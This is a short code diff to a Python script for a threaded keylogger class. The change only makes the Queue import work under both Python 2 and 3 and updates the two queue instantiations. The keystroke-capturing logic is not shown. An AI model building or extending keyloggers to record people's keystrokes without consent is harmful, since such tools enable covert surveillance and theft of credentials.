@@ -1,5 +1,8 @@
 import threading
-import queue
+try:
+    from queue import Queue
+except ImportError:
+    from Queue import Queue
 import time
 
 import keyboard
@@ -35,8 +38,8 @@ class Keylogger(threading.Thread):
 
 # Queue is used to share items between
 # the threads.
-queue_ = queue.Queue()
-killswitch = queue.Queue()
+queue_ = Queue()
+killswitch = Queue()
 
 # Create an instance of the worker
 worker = Keylogger(queue_, killswitch)
